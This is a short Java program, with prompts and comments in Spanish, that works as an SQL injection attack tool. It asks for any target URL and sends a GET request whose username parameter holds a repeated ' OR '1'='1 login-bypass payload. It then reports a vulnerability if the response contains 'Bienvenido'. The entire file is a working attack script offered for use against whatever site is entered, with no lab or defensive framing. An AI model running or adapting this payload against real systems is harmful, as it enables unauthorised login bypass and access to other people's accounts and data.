package Inyeccion_SQL;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Scanner;

public class SQL_Injection {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.print("Ingrese la URL objetivo: ");
        String targetUrl = scanner.nextLine();

        System.out.print("Ingrese el número de inyecciones de SQL que desea generar: ");
        int numInjections = scanner.nextInt();

        String payload = "";
        for (int i = 1; i <= numInjections; i++) {
            payload += "' OR '1'='1 ";
        }

        try {
            // Codificar el payload para que sea seguro enviarlo en la URL
            String encodedPayload = URLEncoder.encode(payload, "UTF-8");

            // Construir la URL con el payload inyectado
            URL url = new URL(targetUrl + "?username=" + encodedPayload + "&password=test");

            // Abrir la conexión HTTP
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            // Leer la respuesta del servidor
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            // Analizar la respuesta y determinar si la inyección fue exitosa
            if (response.toString().contains("Bienvenido")) {
                System.out.println("Inyección de SQL exitosa. Se encontró una vulnerabilidad.");
            } else {
                System.out.println("No se encontraron indicios de inyección de SQL en la respuesta.");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
